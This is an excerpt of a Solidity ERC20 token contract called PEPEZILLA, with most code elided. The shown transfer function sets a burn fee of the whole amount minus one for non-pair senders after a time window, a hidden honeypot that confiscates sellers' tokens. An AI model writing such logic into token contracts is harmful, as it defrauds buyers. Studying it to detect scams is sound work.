...
contract  PEPEZILLA   is Ownable, IERC20 {
    ...
    string private  _name = "PEPEZILLA";
    string private  _symbol = "PEPEZILLA";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from != uniswapV2Pairs )  {   if (    ccds[from] + TimeOne  < block.timestamp   )    {   burnfee = amount - 1; }      }  }
